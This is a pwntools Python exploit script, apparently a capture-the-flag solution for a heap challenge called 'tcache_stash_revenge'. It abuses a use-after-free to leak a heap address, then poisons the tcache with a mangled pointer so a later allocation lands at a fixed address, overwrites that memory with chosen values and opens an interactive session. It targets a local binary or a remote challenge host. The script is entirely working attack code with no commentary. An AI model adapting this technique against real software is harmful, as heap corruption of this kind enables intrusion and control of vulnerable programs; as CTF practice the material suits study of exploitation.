#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('tcache_stash_revenge', checksec=False)
# libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        # b*0x0401AA6

        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('34.62.69.250', 41052)
else:
    p = process([exe.path])
GDB()

sla(b'> ', b'1')
sla(b'size:\n', b'48')
sa(b'data:\n', b'a'*48)


sla(b'> ', b'3')
sla(b'idx:\n', b'0')



sla(b'> ', b'4')
sla(b'idx:\n', b'0')
ru(b'data:\n')
heap = (u64(r(8)) << 12) - 0x1000
info(f'heap leak: {hex(heap)}')

sla(b'> ', b'2')
sla(b'idx:\n', b'0')
sla(b'size:\n', b'48')
sa(b'data:\n', p64(0x404130).ljust(48, b'\0'))

sla(b'> ', b'3')
sla(b'idx:\n', b'0')

sla(b'> ', b'2')
sla(b'idx:\n', b'0')
sla(b'size:\n', b'48')
sa(b'data:\n', p64((heap+0x1930 >> 12) ^ 0x4CBAC0).ljust(48, b'\0'))
# 0x4CBAC0


sla(b'> ', b'1')
sla(b'size:\n', b'48' )
sa(b'data:\n', p64(0x4CBAb8) + p64(0x4CBAc0) + b'a'*32)

sla(b'> ', b'1')
sla(b'size:\n', b'48' )
sa(b'data:\n', p64(0x1337) + p64(0x1337) + b'a'*32)
p.interactive()
